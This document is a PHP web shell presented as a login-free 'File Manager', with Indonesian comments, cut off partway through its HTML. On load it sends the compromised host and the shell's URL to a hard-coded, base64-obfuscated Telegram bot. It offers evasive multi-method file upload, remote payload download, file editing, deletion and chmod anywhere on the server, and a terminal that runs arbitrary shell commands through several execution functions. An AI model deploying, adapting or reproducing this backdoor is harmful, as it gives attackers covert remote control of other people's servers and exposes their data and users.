<?php
// ============================================================
// FILE MANAGER v2.0 — CLEAN + ADAPTIVE UPLOAD + TERMINAL
// Single file. Tanpa login. Dengan Telegram reporter.
// ============================================================

@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
error_reporting(0);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set('upload_max_filesize', '2048m');
@ini_set('post_max_size', '2048m');
@ignore_user_abort(true);

if (session_status() !== PHP_SESSION_ACTIVE) @session_start();
if (ob_get_level()) @ob_end_clean();

// ============================================================
// TELEGRAM REPORTER
// ============================================================
$tk = base64_decode("ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==");
$cid = base64_decode("ODkzMDE3NDQ2Mw==");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}

/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("kontolbengkak:\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}

// ============================================================
// HELPERS
// ============================================================
function fm_formatSize($s) {
    $s = (int)$s;
    $u = ['B','KB','MB','GB','TB']; $i = 0;
    while ($s >= 1024 && $i < 4) { $s /= 1024; $i++; }
    return round($s, 2) . ' ' . $u[$i];
}

function fm_safeName($n) {
    if (!is_string($n) || $n === '') return null;
    $n = basename($n);
    $n = str_replace(["\0","\r","\n","\t"], '', $n);
    if ($n === '.' || $n === '..') return null;
    $n = str_replace(['/', '\\'], '_', $n);
    $n = preg_replace('/[^a-zA-Z0-9._\- ]/', '_', $n);
    $n = trim($n);
    if ($n === '' || $n === '.' || $n === '..') return null;
    return $n;
}

function fm_json($data) {
    @header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

function fm_listDir($dir) {
    $out = [];
    if (!is_dir($dir) || !is_readable($dir)) return $out;
    $items = @scandir($dir);
    if (!is_array($items)) return $out;
    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        $isDir = @is_dir($p);
        $perm = @fileperms($p);
        $permStr = $perm ? substr(sprintf('%o', $perm), -4) : '????';
        $color = '#8080a0';
        if ($perm) {
            $o = octdec($permStr);
            if ($o & 0002) $color = '#f85149';
            elseif ($o & 0020) $color = '#f97316';
            elseif ($o & 0200) $color = '#22c55e';
        }
        $out[] = [
            'name' => $f,
            'type' => $isDir ? 'Folder' : 'File',
            'size' => $isDir ? '-' : fm_formatSize(@filesize($p)),
            'permission' => $permStr,
            'perm_color' => $color,
            'mtime' => @filemtime($p),
        ];
    }
    usort($out, function($a, $b) {
        if ($a['type'] !== $b['type']) return $a['type'] === 'Folder' ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $out;
}

// ============================================================
// FILE OPS
// ============================================================
$currentDirectory = @realpath(getcwd()) ?: getcwd();
$errorMessage = '';
$responseMessage = '';

if (isset($_GET['lph'])) {
    $t = @realpath($_GET['lph']);
    if ($t && is_dir($t)) { @chdir($t); $currentDirectory = $t; }
}

if (isset($_GET['goto_root'])) {
    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
    if (!empty($docRoot) && is_dir($docRoot)) {
        $real = @realpath($docRoot);
        if ($real) { @chdir($real); header('Location: ?lph=' . urlencode($real)); exit; }
    }
    header('Location: ?lph=' . urlencode(dirname(__FILE__)));
    exit;
}

// ============================================================
// ADAPTIVE UPLOAD HANDLER
// ============================================================
function fm_tryWrite($dest, $data, &$log) {
    $written = @file_put_contents($dest, $data);
    if ($written === false) { $log[] = "write_failed"; return false; }
    @chmod($dest, 0644);
    $size = @filesize($dest);
    if ($size === false || $size === 0) { $log[] = "zero_size"; @unlink($dest); return false; }
    if ($size < strlen($data)) { $log[] = "partial_write ($size < " . strlen($data) . ")"; }
    return true;
}

// --- Method 2: base64 direct ---
if (isset($_POST['upload_method']) && $_POST['upload_method'] === 'b64') {
    @header('Content-Type: application/json; charset=utf-8');
    $filename = fm_safeName($_POST['filename'] ?? '');
    $b64 = $_POST['file_data'] ?? '';
    $targetDir = @realpath($_POST['target_dir'] ?? $currentDirectory) ?: $currentDirectory;
    if (!$filename) fm_json(['err' => 'Invalid filename']);
    $data = base64_decode($b64, true);
    if ($data === false) fm_json(['err' => 'Invalid base64']);
    $dest = $targetDir . '/' . $filename;
    $log = [];
    if (!fm_tryWrite($dest, $data, $log)) fm_json(['err' => 'Write failed', 'log' => $log]);
    fm_json(['ok' => true, 'method' => 'b64', 'name' => $filename, 'size' => strlen($data)]);
}

// --- Method 3: chunked base64 ---
if (isset($_POST['upload_method']) && $_POST['upload_method'] === 'chunked') {
    @header('Content-Type: application/json; charset=utf-8');
    $uploadId = preg_replace('/[^a-zA-Z0-9]/', '', $_POST['upload_id'] ?? '');
    $filename = fm_safeName($_POST['filename'] ?? '');
    $ci = (int)($_POST['chunk_index'] ?? 0);
    $total = (int)($_POST['total_chunks'] ?? 1);
    $b64 = $_POST['chunk_data'] ?? '';
    $targetDir = @realpath($_POST['target_dir'] ?? $currentDirectory) ?: $currentDirectory;

    if (!$uploadId || !$filename) fm_json(['err' => 'Invalid params']);
    $data = base64_decode($b64, true);
    if ($data === false) fm_json(['err' => 'Invalid base64']);

    $tmpDir = sys_get_temp_dir() . '/.fm_chunks';
    if (!is_dir($tmpDir)) @mkdir($tmpDir, 0755, true);
    $tmpFile = $tmpDir . '/' . $uploadId . '.part';
    $metaFile = $tmpDir . '/' . $uploadId . '.meta';

    if ($ci === 0) {
        @file_put_contents($tmpFile, '');
        @file_put_contents($metaFile, json_encode([
            'filename' => $filename,
            'total' => $total,
            'target_dir' => $targetDir,
            'started' => time()
        ]));
    }

    $written = @file_put_contents($tmpFile, $data, FILE_APPEND | LOCK_EX);
    if ($written === false) fm_json(['err' => 'Chunk write failed']);

    if ($ci >= $total - 1) {
        $meta = @json_decode(@file_get_contents($metaFile), true) ?: [];
        $finalName = $meta['filename'] ?? $filename;
        $finalDir = $meta['target_dir'] ?? $targetDir;
        $dest = rtrim($finalDir, '/\\') . '/' . $finalName;
        $size = @filesize($tmpFile);
        if ($size === 0) { @unlink($tmpFile); @unlink($metaFile); fm_json(['err' => 'Zero size after assembly']); }
        if (@rename($tmpFile, $dest)) {
            @chmod($dest, 0644);
            @unlink($metaFile);
            fm_json(['ok' => true, 'method' => 'chunked', 'name' => $finalName, 'size' => $size]);
        }
        if (@copy($tmpFile, $dest)) {
            @chmod($dest, 0644); @unlink($tmpFile); @unlink($metaFile);
            fm_json(['ok' => true, 'method' => 'chunked_copy', 'name' => $finalName, 'size' => $size]);
        }
        fm_json(['err' => 'Finalize failed']);
    }

    fm_json(['ok' => true, 'method' => 'chunked', 'complete' => false, 'chunk' => $ci, 'written' => $written]);
}

// --- Method 4/5: neutral name then rename ---
if (isset($_POST['upload_method']) && $_POST['upload_method'] === 'neutral') {
    @header('Content-Type: application/json; charset=utf-8');
    $realName = fm_safeName($_POST['real_filename'] ?? '');
    $neutralName = fm_safeName($_POST['neutral_filename'] ?? '');
    $targetDir = @realpath($_POST['target_dir'] ?? $currentDirectory) ?: $currentDirectory;
    if (!$realName || !$neutralName) fm_json(['err' => 'Invalid name']);
    if (empty($_FILES['file']['tmp_name'])) fm_json(['err' => 'No file']);

    $neutral = $targetDir . '/' . $neutralName;
    if (!@move_uploaded_file($_FILES['file']['tmp_name'], $neutral)) {
        $raw = @file_get_contents($_FILES['file']['tmp_name']);
        if ($raw === false) fm_json(['err' => 'Read tmp failed']);
        if (@file_put_contents($neutral, $raw) === false) fm_json(['err' => 'Write neutral failed']);
    }
    @chmod($neutral, 0644);

    $size = @filesize($neutral);
    if ($size === 0) { @unlink($neutral); fm_json(['err' => 'Neutral file zero size']); }

    $finalPath = $neutral;
    $renamed = false;
    if (!empty($_POST['rename_after'])) {
        $finalPath = $targetDir . '/' . $realName;
        if (@rename($neutral, $finalPath)) { @chmod($finalPath, 0644); $renamed = true; }
    }
    fm_json(['ok' => true, 'method' => 'neutral', 'path' => $finalPath, 'neutral' => $neutral, 'renamed' => $renamed, 'size' => $size]);
}

// --- Method 1: normal multipart ---
if (isset($_POST['upload_method']) && $_POST['upload_method'] === 'normal') {
    @header('Content-Type: application/json; charset=utf-8');
    $targetDir = @realpath($_POST['target_dir'] ?? $currentDirectory) ?: $currentDirectory;
    $uploaded = [];
    $log = [];

    $files = $_FILES['file'] ?? $_FILES['files'] ?? null;
    if ($files && !empty($files['name'])) {
        $names = is_array($files['name']) ? $files['name'] : [$files['name']];
        $tmps = is_array($files['tmp_name']) ? $files['tmp_name'] : [$files['tmp_name']];
        for ($i = 0; $i < count($names); $i++) {
            $name = fm_safeName($names[$i]);
            if ($name === null) continue;
            $dest = $targetDir . '/' . $name;
            $ok = false;
            if (@move_uploaded_file($tmps[$i], $dest)) $ok = true;
            else {
                $raw = @file_get_contents($tmps[$i]);
                if ($raw !== false && @file_put_contents($dest, $raw) !== false) $ok = true;
            }
            if ($ok) {
                @chmod($dest, 0644);
                $size = @filesize($dest);
                if ($size === 0) { @unlink($dest); $log[] = "$name:zero_size"; continue; }
                $uploaded[] = ['name' => $name, 'size' => $size];
            } else $log[] = "$name:move_failed";
        }
    }
    if (empty($uploaded)) fm_json(['err' => 'No file uploaded', 'log' => $log]);
    fm_json(['ok' => true, 'method' => 'normal', 'uploaded' => $uploaded]);
}

// --- Legacy upload ---
if (isset($_POST['upload']) || isset($_POST['multi_upload'])) {
    @header('Content-Type: application/json; charset=utf-8');
    $targetDir = @realpath($_POST['target_dir'] ?? $currentDirectory) ?: $currentDirectory;
    $uploaded = [];
    $isJson = isset($_POST['multi_upload']);

    if (!empty($_FILES['file']['name'])) {
        $files = is_array($_FILES['file']['name']) ? $_FILES['file'] : ['name' => [$_FILES['file']['name']], 'tmp_name' => [$_FILES['file']['tmp_name']]];
        for ($i = 0; $i < count($files['name']); $i++) {
            $name = fm_safeName($files['name'][$i]);
            if ($name === null) continue;
            $dest = $targetDir . '/' . $name;
            if (@move_uploaded_file($files['tmp_name'][$i], $dest)) {
                @chmod($dest, 0644);
                $size = @filesize($dest);
                if ($size === 0) { @unlink($dest); continue; }
                $uploaded[] = ['name' => $name, 'size' => $size];
            }
        }
    }
    if (!empty($_FILES['files']['name'])) {
        $files = $_FILES['files'];
        for ($i = 0; $i < count($files['name']); $i++) {
            $name = fm_safeName($files['name'][$i]);
            if ($name === null) continue;
            $dest = $targetDir . '/' . $name;
            if (@move_uploaded_file($files['tmp_name'][$i], $dest)) {
                @chmod($dest, 0644);
                $size = @filesize($dest);
                if ($size === 0) { @unlink($dest); continue; }
                $uploaded[] = ['name' => $name, 'size' => $size];
            }
        }
    }
    if ($isJson) fm_json(['ok' => true, 'uploaded' => $uploaded]);
    if (!empty($uploaded)) $responseMessage = count($uploaded) . ' file(s) uploaded';
}

// Remote upload
if (isset($_POST['remote_upload']) && !empty($_POST['remote_url'])) {
    $url = trim($_POST['remote_url']);
    $filename = fm_safeName($_POST['remote_filename'] ?? basename(parse_url($url, PHP_URL_PATH)));
    if ($filename === null || $filename === '') $filename = 'remote_' . time() . '.bin';
    $dest = $currentDirectory . '/' . $filename;
    $data = false;
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_TIMEOUT => 60, CURLOPT_USERAGENT => 'Mozilla/5.0']);
        $data = curl_exec($ch); curl_close($ch);
    }
    if (!$data && ini_get('allow_url_fopen')) $data = @file_get_contents($url);
    if ($data === false) $errorMessage = 'Remote download failed';
    elseif (@file_put_contents($dest, $data) !== false) {
        @chmod($dest, 0644);
        $responseMessage = 'Downloaded: ' . $filename . ' (' . fm_formatSize(strlen($data)) . ')';
    } else $errorMessage = 'Write failed';
}

// New folder
if (isset($_POST['newfolder'])) {
    $name = fm_safeName($_POST['foldername'] ?? '');
    if ($name === null) $errorMessage = 'Invalid folder name';
    else {
        $p = $currentDirectory . '/' . $name;
        if (@mkdir($p, 0755)) $responseMessage = 'Folder created: ' . $name;
        else $errorMessage = 'Failed to create folder';
    }
}

// New file
if (isset($_POST['newfile'])) {
    $name = fm_safeName($_POST['filename'] ?? '');
    $content = $_POST['filecontent'] ?? '';
    if ($name === null) $errorMessage = 'Invalid filename';
    else {
        $p = $currentDirectory . '/' . $name;
        if (@file_put_contents($p, $content) !== false) $responseMessage = 'File created: ' . $name;
        else $errorMessage = 'Failed to create file';
    }
}

// Delete
if (isset($_GET['del'])) {
    $target = @realpath($_GET['del']);
    if ($target && $target !== $currentDirectory) {
        if (is_dir($target)) {
            $it = @new RecursiveIteratorIterator(@new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
            if ($it) foreach ($it as $f) { if ($f->isDir()) @rmdir($f->getPathname()); else @unlink($f->getPathname()); }
            if (@rmdir($target)) $responseMessage = 'Folder deleted';
            else $errorMessage = 'Folder delete partial/failed';
        } else {
            if (@unlink($target)) $responseMessage = 'File deleted';
            else $errorMessage = 'Delete failed';
        }
    }
}

// Rename
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = @realpath($_POST['rename_old']);
    $new = fm_safeName($_POST['rename_new']);
    if ($old && $new !== null && file_exists($old)) {
        $dest = dirname($old) . '/' . $new;
        if (@rename($old, $dest)) $responseMessage = 'Renamed to ' . $new;
        else $errorMessage = 'Rename failed';
    } else $errorMessage = 'Invalid rename';
}

// Edit save
if (isset($_POST['edit_file']) && isset($_POST['edit_content'])) {
    $file = @realpath($_POST['edit_file']);
    if ($file && is_file($file)) {
        if (!is_writable($file)) @chmod($file, 0644);
        if (@file_put_contents($file, (string)$_POST['edit_content']) !== false) $responseMessage = 'File saved';
        else $errorMessage = 'Failed to save file';
    } else $errorMessage = 'File not found';
}

// Chmod
if (isset($_POST['chmod_file']) && isset($_POST['chmod_mode'])) {
    $file = @realpath($_POST['chmod_file']);
    $mode = octdec($_POST['chmod_mode']);
    if ($file && @chmod($file, $mode)) $responseMessage = 'Chmod applied';
    else $errorMessage = 'Chmod failed';
}

// ============================================================
// TERMINAL HANDLER
// ============================================================
if (isset($_POST['terminal_cmd'])) {
    @header('Content-Type: application/json; charset=utf-8');
    $cmd = (string)$_POST['terminal_cmd'];
    $cwd = @realpath($_POST['terminal_cwd'] ?? $currentDirectory) ?: $currentDirectory;

    if (trim($cmd) === '') fm_json(['ok' => false, 'err' => 'Empty command']);

    $output = '';
    $exitCode = 0;

    if (function_exists('proc_open')) {
        $descriptors = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $env = ['PATH' => getenv('PATH') ?: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOME' => $cwd, 'TERM' => 'xterm'];
        $process = @proc_open($cmd, $descriptors, $pipes, $cwd, $env);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            $exitCode = proc_close($process);
            $output = $stdout . ($stderr !== '' ? "\n[stderr]\n" . $stderr : '');
            fm_json(['ok' => true, 'output' => $output, 'exit' => $exitCode, 'cwd' => $cwd, 'engine' => 'proc_open']);
        }
    }

    if (function_exists('shell_exec')) {
        $out = @shell_exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
        if ($out !== null) fm_json(['ok' => true, 'output' => (string)$out, 'exit' => 0, 'cwd' => $cwd, 'engine' => 'shell_exec']);
    }

    if (function_exists('exec')) {
        $lines = [];
        @exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1', $lines, $exitCode);
        fm_json(['ok' => true, 'output' => implode("\n", $lines), 'exit' => $exitCode, 'cwd' => $cwd, 'engine' => 'exec']);
    }

    if (function_exists('system')) {
        ob_start();
        @system('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1', $exitCode);
        $out = ob_get_clean();
        fm_json(['ok' => true, 'output' => (string)$out, 'exit' => $exitCode, 'cwd' => $cwd, 'engine' => 'system']);
    }

    fm_json(['ok' => false, 'err' => 'No execution function available']);
}

$fileDetails = fm_listDir($currentDirectory);
$sysInfo = [
    'os' => php_uname('s'),
    'user' => @get_current_user() ?: 'unknown',
    'host' => $_SERVER['HTTP_HOST'] ?? 'localhost',
];

// ============================================================
// EDITOR VIEW
// ============================================================
if (isset($_GET['edit'])) {
    $editFile = @realpath($_GET['edit']);
    if ($editFile && is_file($editFile) && is_readable($editFile)) {
        $editContent = @file_get_contents($editFile);
        if ($editContent === false) $editContent = '';
        ?>
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Edit: <?php echo htmlspecialchars(basename($editFile)); ?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'JetBrains Mono','Consolas',monospace;font-size:13px;background:#0a0a12;color:#e0e0f0;min-height:100vh}
.hdr{background:#10101c;border-bottom:1px solid #1e1e30;padding:8px 12px;display:flex;align-items:center;justify-content:space-between;gap:8px;position:sticky;top:0;z-index:10}
.hdr-l{display:flex;align-items:center;gap:8px;flex:1;min-width:0}
.hdr-t{font-size:12px;color:#8080a0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.btn{padding:5px 10px;border-radius:3px;font-size:11px;border:1px solid #2a2a40;background:#0d0d18;color:#e0e0f0;cursor:pointer;text-decoration:none;font-family:inherit;display:inline-flex;align-items:center;gap:4px}
.btn:hover{border-color:#4a9eff;color:#4a9eff}
.btn-p{background:#4a9eff;color:#fff;border-color:#4a9eff;font-weight:500}
.btn-p:hover{background:#2a5a9f;color:#fff}
.editor{width:100%;min-height:calc(100vh - 45px);background:#000;color:#e0e0f0;font-family:inherit;font-size:13px;line-height:1.5;padding:14px;border:none;outline:none;resize:none;tab-size:4}
</style></head><body>
<div class="hdr">
    <div class="hdr-l">
        <a href="?lph=<?php echo urlencode(dirname($editFile)); ?>" class="btn">← Back</a>
        <span class="hdr-t"><?php echo htmlspecialchars($editFile); ?></span>
    </div>
    <div><button class="btn btn-p" onclick="document.getElementById('editForm').submit()">💾 Save</button></div>
</div>
<form method="POST" id="editForm">
    <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($editFile); ?>">
    <textarea class="editor" name="edit_content" id="editor" spellcheck="false"><?php echo htmlspecialchars($editContent); ?></textarea>
</form>
<script>
document.getElementById('editor').addEventListener('keydown', function(e) {
    if (e.key === 'Tab') {
        e.preventDefault();
        var s = this.selectionStart, en = this.selectionEnd;
        this.value = this.value.substring(0, s) + '    ' + this.value.substring(en);
        this.selectionStart = this.selectionEnd = s + 4;
    }
    if (e.ctrlKey && e.key === 's') { e.preventDefault(); document.getElementById('editForm').submit(); }
});
</script>
</body></html>
        <?php exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?php echo htmlspecialchars($sysInfo['host']); ?> - File Manager</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'JetBrains Mono','Consolas',monospace;font-size:12px;background:#0a0a12;color:#e0e0f0;min-height:100vh}
.app-header{background:linear-gradient(135deg,#050510,#0a0a1e);border-bottom:1px solid #1e1e30;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;gap:8px;position:sticky;top:0;z-index:50}
.header-title{font-size:14px;font-weight:600}
.sys-badge{background:#08081a;border:1px solid #1e1e30;padding:4px 8px;border-radius:4px;font-size:10px;color:#8080a0}
.btn-logout{background:rgba(248,81,73,.1);color:#f85149;border:1px solid rgba(248,81,73,.3);padding:4px 10px;border-radius:4px;font-size:10px;text-decoration:none}
.btn-logout:hover{background:#f85149;color:#fff}
.layout{max-width:100%;padding:8px 12px}
.breadcrumb{background:#10101c;border:1px solid #1e1e30;border-radius:4px;padding:8px 12px;display:flex;align-items:center;gap:8px;margin-bottom:6px}
.breadcrumb-path{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#8080a0}
.breadcrumb-path strong{color:#4a9eff;margin-right:6px}
.breadcrumb-path a{color:#e0e0f0;text-decoration:none;padding:2px 4px;border-radius:3px}
.breadcrumb-path a:hover{color:#4a9eff;background:#1a1a28}
.breadcrumb-root{color:#4a9eff;padding:4px 10px;border:1px solid #2a2a40;border-radius:3px;text-decoration:none;font-size:10px}
.breadcrumb-root:hover{background:#4a9eff;color:#fff}
.toolbar{display:flex;gap:4px;padding:6px 8px;background:#0d0d18;border:1px solid #1e1e30;border-radius:4px;align-items:center;flex-wrap:wrap;margin-bottom:6px}
.tb-btn{background:#10101c;border:1px solid #2a2a40;color:#e0e0f0;padding:6px 12px;font-size:11px;font-family:inherit;font-weight:500;border-radius:3px;cursor:pointer}
.tb-btn:hover{background:#1a1a28;border-color:#4a9eff;color:#4a9eff}
.msg-success,.msg-error{padding:8px 12px;border-radius:3px;font-size:12px;margin-bottom:6px;border:1px solid #1e1e30}
.msg-success{color:#22c55e;background:rgba(34,197,94,.08)}
.msg-error{color:#f85149;background:rgba(248,81,73,.08)}
.file-table{width:100%;border-collapse:collapse;background:#10101c;border:1px solid #1e1e30;border-radius:4px;overflow:hidden}
.file-table th{background:#0d0d18;color:#8080a0;font-size:10px;text-transform:uppercase;padding:8px 12px;text-align:left;font-weight:600;border-bottom:1px solid #2a2a40;letter-spacing:.08em}
.file-table td{padding:8px 12px;border-bottom:1px solid #1e1e30;font-size:12px;vertical-align:middle}
.file-table tbody tr:hover{background:#1a1a28}
.file-table td a{color:#e0e0f0;text-decoration:none}
.file-table td a:hover{color:#4a9eff}
.action-btns{display:flex;gap:4px;flex-wrap:nowrap}
.action-btns a{padding:4px 10px;font-size:10px;border-radius:3px;border:1px solid #1e3a5f;color:#e0e0f0;text-decoration:none;display:inline-flex;align-items:center;height:24px}
.action-btns a:hover{background:#1a1a28;border-color:#4a9eff;color:#4a9eff}
.action-btns a.act-del{color:#f85149}
.action-btns a.act-del:hover{background:#f85149;color:#fff;border-color:#f85149}
.btn{padding:5px 10px;border-radius:3px;font-size:11px;font-weight:500;border:1px solid #1e1e30;cursor:pointer;display:inline-flex;align-items:center;gap:4px;text-decoration:none;color:#e0e0f0;background:#0d0d18;font-family:inherit}
.btn:hover{border-color:#4a9eff;color:#4a9eff}
.btn-primary{background:#4a9eff;color:#fff;border-color:#4a9eff;font-weight:600}
.btn-primary:hover{background:#2a5a9f;color:#fff}
.btn-danger{background:rgba(248,81,73,.15);color:#f85149;border-color:rgba(248,81,73,.4)}
.btn-danger:hover{background:#f85149;color:#fff}
.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);display:flex;justify-content:center;align-items:center;z-index:99999;padding:20px;opacity:0;pointer-events:none;transition:opacity .25s}
.modal-overlay:not(.hidden){opacity:1;pointer-events:auto}
.modal{background:#10101c;border:1px solid #2a2a40;border-radius:6px;max-width:600px;width:100%;max-height:92vh;display:flex;flex-direction:column;overflow:hidden}
.modal-header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid #1e1e30;background:#0d0d18}
.modal-title{font-weight:600;font-size:13px;color:#4a9eff}
.modal-close{background:none;border:none;color:#8080a0;cursor:pointer;padding:2px 6px;font-size:18px}
.modal-close:hover{color:#f85149}
.modal-body{padding:12px 14px;overflow-y:auto;flex:1;font-size:12px}
.modal-footer{padding:10px 14px;border-top:1px solid #1e1e30;display:flex;justify-content:flex-end;gap:6px;background:#0d0d18}
.hidden{display:none!important}
.form-group{margin-bottom:10px}
.form-label{display:block;font-size:11px;color:#8080a0;margin-bottom:4px;font-weight:500}
.form-input{width:100%;background:#08081a;border:1px solid #1e1e30;color:#e0e0f0;padding:7px 10px;border-radius:3px;font-family:inherit;font-size:12px;outline:none}
.form-input:focus{border-color:#4a9eff}
.up-log{background:#000;border:1px solid #1e1e30;border-radius:4px;padding:10px;font-family:inherit;font-size:11px;color:#22c55e;white-space:pre-wrap;word-break:break-all;max-height:240px;overflow-y:auto;line-height:1.5;margin-top:10px}
.up-progress{height:6px;background:#000;border-radius:3px;overflow:hidden;margin-top:10px}
.up-progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#4a9eff,#a855f7);transition:width .3s}
.up-zone{border:2px dashed #4a9eff;border-radius:8px;padding:30px 20px;text-align:center;background:rgba(74,158,255,.03);cursor:pointer}
.up-zone:hover{background:rgba(74,158,255,.08)}
::-webkit-scrollbar{width:8px;height:6px}
::-webkit-scrollbar-track{background:#0a0a12}
::-webkit-scrollbar-thumb{background:#2a2a40;border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:#4a9eff}
@media(max-width:768px){
    .app-header{padding:8px 10px;flex-wrap:wrap}
    .sys-badge{display:none}
    .layout{padding:6px 8px}
    .file-table th:nth-child(2),.file-table td:nth-child(2),
    .file-table th:nth-child(4),.file-table td:nth-child(4){display:none}
    .action-btns a{padding:2px 6px;font-size:9px;height:20px}
}
</style>
</head>
<body>

<header class="app-header">
    <div class="header-title">// File Manager v2.0</div>
    <div style="display:flex;gap:6px;align-items:center;">
        <span class="sys-badge"><?php echo htmlspecialchars($sysInfo['os']); ?></span>
        <span class="sys-badge"><?php echo htmlspecialchars($sysInfo['user']); ?></span>
        <a href="?logout=1" class="btn-logout" onclick="return confirm('Logout?')">Logout</a>
    </div>
</header>

<div class="layout">

<?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo htmlspecialchars($responseMessage); ?></div><?php endif; ?>
<?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo htmlspecialchars($errorMessage); ?></div><?php endif; ?>

<div class="breadcrumb">
    <div class="breadcrumb-path">
        <strong>DIR:</strong>
        <?php
        $bp = str_replace('\\', '/', $currentDirectory);
        $pr = explode('/', $bp);
        foreach ($pr as $i => $p) {
            if ($p == '' && $i == 0) echo '<a href="?lph=/">/</a>';
            elseif (!empty($p)) {
                $l = implode('/', array_slice($pr, 0, $i + 1));
                echo '<a href="?lph=' . urlencode($l) . '">' . htmlspecialchars($p) . '</a>/';
            }
        }
        ?>
    </div>
    <a href="?goto_root=1" class="breadcrumb-root">ROOT</a>
</div>

<div class="toolbar">
    <button class="tb-btn" onclick="showNewFolder()">New Folder</button>
    <button class="tb-btn" onclick="showCreateFile()">New File</button>
    <button class="tb-btn" onclick="showModal('adaptiveUpload')">Adaptive Upload</button>
    <button class="tb-btn" onclick="showModal('remote')">Remote</button>
    <button class="tb-btn" onclick="showTerminal()">Terminal</button>
</div>

<div style="overflow-x:auto;">
<table class="file-table">
    <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead>
    <tbody>
    <?php if (count($fileDetails) > 0): ?>
        <?php foreach ($fileDetails as $fd): ?>
            <?php $fp = $currentDirectory . '/' . $fd['name']; ?>
            <tr>
                <td>
                    <?php if ($fd['type'] === 'Folder'): ?>
                        <a href="?lph=<?php echo urlencode($fp); ?>"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php else: ?>
                        <a href="?edit=<?php echo urlencode($fp); ?>"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php endif; ?>
                </td>
                <td><?php echo $fd['type']; ?></td>
                <td><?php echo htmlspecialchars($fd['size']); ?></td>
                <td style="color:<?php echo $fd['perm_color']; ?>;"><?php echo htmlspecialchars($fd['permission']); ?></td>
                <td>
                    <div class="action-btns">
                        <?php if ($fd['type'] === 'File'): ?>
                            <a href="?edit=<?php echo urlencode($fp); ?>">Edit</a>
                        <?php endif; ?>
                        <a href="javascript:void(0)" onclick="showRename('<?php echo htmlspecialchars($fp, ENT_QUOTES); ?>','<?php echo htmlspecialchars($fd['name'], ENT_QUOTES); ?>')">Rename</a>
                        <a href="javascript:void(0)" onclick="showChmod('<?php echo htmlspecialchars($fp, ENT_QUOTES); ?>','<?php echo htmlspecialchars($fd['permission'], ENT_QUOTES); ?>')">Chmod</a>
                        <a href="javascript:void(0)" class="act-del" onclick="confirmDel('<?php echo urlencode($fp); ?>','<?php echo htmlspecialchars($fd['name'], ENT_QUOTES); ?>')">Delete</a>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
    <?php else: ?>
        <tr><td colspan="5" style="text-align:center;color:#505070;padding:20px;">No files.</td></tr>
    <?php endif; ?>
    </tbody>
</table>
</div>

</div>

<!-- MODAL: ADAPTIVE UPLOAD -->
<div class="modal-overlay hidden" id="adaptiveUploadModal">
    <div class="modal" style="max-width:720px;">
        <div class="modal-header">
            <span class="modal-title">Adaptive Upload</span>
            <button class="modal-close" onclick="hideModal('adaptiveUpload')">&times;</button>
        </div>
        <div class="modal-body">
            <div style="background:rgba(74,158,255,.08);border:1px solid rgba(74,158,255,.3);border-radius:4px;padding:10px;margin-bottom:12px;font-size:11px;color:#8080a0;line-height:1.6;">
                <strong style="color:#4a9eff;">5 Metode, Auto-Fallback</strong><br>
                Kalau hasil 0 KB atau gagal, otomatis coba metode berikutnya:<br>
